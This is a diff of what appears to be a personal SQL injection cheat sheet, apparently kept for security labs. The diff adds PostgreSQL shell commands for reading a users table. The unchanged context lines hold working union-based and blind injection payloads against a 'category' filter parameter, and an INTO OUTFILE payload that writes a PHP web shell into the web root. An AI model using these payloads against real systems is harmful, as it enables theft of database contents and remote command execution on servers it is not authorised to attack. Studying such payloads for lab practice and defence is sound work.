@@ -307,7 +307,6 @@ filter?category=Accessories' union all select column_name,null FROM USER_TAB_COL
 Blind SQL Injection:
 and 1=2 union select null from users where password like 'a%' --+
 
-
 Check string output fields
 filter?category=Gifts' union select null,'a',null --+
 
@@ -320,6 +319,12 @@ MySQL:      SELECT @@version
 
 In SQL:
 select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
+
+# POSTGRESS (postgress, postgressql)
+psql -h localhost -U postgres
+\c database
+\d (list)
+select * from users
 
 # SQLMAP
 Save full request with header and body in request.txt:
